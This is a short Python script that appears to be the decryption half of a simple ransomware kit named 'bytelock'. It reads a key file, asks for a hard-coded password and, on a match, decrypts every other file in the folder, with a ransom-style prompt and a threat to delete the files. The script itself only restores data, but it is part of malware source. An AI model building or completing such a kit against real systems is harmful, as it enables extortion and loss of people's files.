import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == 'bytelock.py' or file == 'skey.key' or file == 'decrypt.py':
		continue
	
	if os.path.isfile(file):
		files.append(file)


with open("skey.key","rb") as thekey:
	seckey = thekey.read()


sec = 'legion_x'
user = input('Enter Password to Get your Files Back !  ')

if user == sec:
	for file in files:
		with open(file,"rb") as thefile:
			data = thefile.read()
		dencrypted_data = Fernet(seckey).decrypt(data)
		with open(file,"wb") as thefile:
			thefile.write(dencrypted_data)


else:
	print('Wrong Password ! Should I Delte Them All ? ')
